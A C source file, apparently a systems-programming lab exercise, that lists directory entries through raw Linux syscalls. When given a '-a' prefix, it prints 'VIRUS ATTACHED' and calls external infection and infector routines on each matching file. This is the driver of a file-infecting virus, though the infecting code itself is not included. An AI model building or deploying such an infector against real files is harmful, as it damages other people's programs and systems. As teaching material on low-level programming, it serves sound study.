#include "util.h"

#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141
#define SYS_EXIT 1

#define O_RDONLY 0
#define STDOUT 1
#define BUF_SIZE 8192

extern int system_call(int, int, int, int);
extern void infection();
extern void infector(char *filename);

struct linux_dirent
{
    long d_ino;
    long d_off;
    unsigned short d_reclen;
    char d_name[];
};

/* returns 1 if name starts with prefix, else 0 */
int starts_with(char *name, char *prefix)
{
    int i = 0;
    if (!prefix)
        return 1;
    while (prefix[i])
    {
        if (name[i] != prefix[i])
            return 0;
        i++;
    }
    return 1;
}

int main(int argc, char *argv[])
{
    char buf[BUF_SIZE];
    int fd, nread, bpos;
    struct linux_dirent *d;
    char *prefix = 0;

    /* parse arguments */
    if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a')
    {
        prefix = argv[1] + 2;
    }

    fd = system_call(SYS_OPEN, (int)".", O_RDONLY, 0);
    if (fd < 0)
        system_call(SYS_EXIT, 0x55, 0, 0);

    while (1)
    {
        nread = system_call(SYS_GETDENTS, fd, (int)buf, BUF_SIZE);
        if (nread == 0)
            break;
        if (nread < 0)
            system_call(SYS_EXIT, 0x55, 0, 0);

        for (bpos = 0; bpos < nread;)
        {
            d = (struct linux_dirent *)(buf + bpos);

            if (starts_with(d->d_name, prefix))
            {

                system_call(SYS_WRITE, STDOUT,
                            (int)d->d_name,
                            strlen(d->d_name));

                if (prefix != 0)
                {
                    system_call(SYS_WRITE, STDOUT,
                                (int)" VIRUS ATTACHED\n", 16);

                    infection();
                    infector(d->d_name);
                }
                else
                {
                    system_call(SYS_WRITE, STDOUT, (int)"\n", 1);
                }
            }

            bpos += d->d_reclen; /* ALWAYS advance */
        }
    }

    system_call(SYS_CLOSE, fd, 0, 0);
    return 0;
}
